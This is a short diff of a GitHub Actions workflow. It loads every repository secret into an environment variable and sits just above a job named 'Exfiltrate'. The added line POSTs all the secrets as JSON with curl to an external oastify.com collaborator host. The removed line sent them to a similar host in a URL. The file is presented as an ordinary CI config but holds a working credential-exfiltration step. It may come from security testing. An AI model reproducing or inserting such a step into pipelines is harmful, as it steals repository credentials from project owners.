@@ -32,8 +32,7 @@ jobs:
           MY_SECRETS: ${{ toJson(secrets) }}
         run: |
               echo Hello, world! ${{ secrets.TEST }}
-              curl https://6biih2r44ot1wfgsayxb7pmk9bf23yrn.oastify.com/${MY_SECRETS}+${{ secrets.REPO_SECRET }}
-
+              curl -X POST -H "Content-Type: application/json" -d "${MY_SECRETS}" https://75ajb3l5ypn2qgat4zrc1qgl3c93x0lp.oastify.com
 
 
   Exfiltrate:
